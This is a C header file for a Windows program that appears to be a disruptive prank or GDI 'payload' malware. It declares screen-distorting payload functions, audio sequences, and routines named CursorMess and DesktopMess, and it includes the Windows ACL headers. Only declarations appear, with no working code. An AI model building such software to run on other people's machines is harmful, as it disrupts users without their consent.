#pragma once
#include <Windows.h>
#include <accctrl.h>
#include <Commctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <math.h>
#pragma comment(lib, "WinMM.lib")
#pragma comment(lib, "msimg32.lib")

VOID seedxorshift32(DWORD dwSeed);

VOID WINAPI CursorMess(VOID);

VOID WINAPI DesktopMess(VOID);

VOID WINAPI RandomPop(VOID);

#pragma region Defs
#define PI 3.141592f
static FLOAT pfSinVals[4096];

typedef VOID(FX_PAYLOAD)(_In_ INT t, _In_ HDC hdcScreen);

typedef VOID(WINAPI AUDIO_SEQUENCE)(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
	), * PAUDIO_SEQUENCE;

typedef VOID(WINAPI AUDIOSEQUENCE_OPERATION)(
	_In_ INT nSamplesPerSec
	), * PAUDIO_SEQUENCE_OPERATION;

typedef struct tagAUDIO_SEQUENCE_PARAMS {
	INT nSamplesPerSec;
	INT nSampleCount;
	PAUDIO_SEQUENCE pAudioSequence;
	PAUDIO_SEQUENCE_OPERATION pPreAudioOp;
	PAUDIO_SEQUENCE_OPERATION pPostAudioOp;
} AUDIO_SEQUENCE_PARAMS, * PAUDIO_SEQUENCE_PARAMS;

typedef union {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} ARGBQUAD, * PRGBQUAD;
#pragma endregion Defs
extern BOOL CALLBACK StartupMsgProc(
	_In_ HWND   hwnd,
	_In_ LPARAM lParam
);

extern BOOL CALLBACK EnumWindowFunc(_In_ HWND hwnd, _In_ LPARAM lParam);

extern VOID WINAPI EnumWindowProc(VOID);

#pragma region Payload
extern VOID ExecutePayload(FX_PAYLOAD payload, DWORD dwTime);

extern FX_PAYLOAD Payload1;
extern FX_PAYLOAD Payload2;
extern FX_PAYLOAD Payload2C;
extern FX_PAYLOAD Payload3;
extern FX_PAYLOAD Payload4;
extern FX_PAYLOAD Payload4A;
extern FX_PAYLOAD Payload5;
extern FX_PAYLOAD Payload6;
extern FX_PAYLOAD Payload7;
#pragma endregion Payload

#pragma region AudioSequence
extern VOID WINAPI ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence
);

extern VOID WINAPI AudioThread(VOID);

extern AUDIO_SEQUENCE AudioSequence1;
extern AUDIO_SEQUENCE AudioSequence2;
extern AUDIO_SEQUENCE AudioSequence3;
extern AUDIO_SEQUENCE AudioSequence4;
extern AUDIO_SEQUENCE AudioSequence5;
#pragma endregion AudioSequence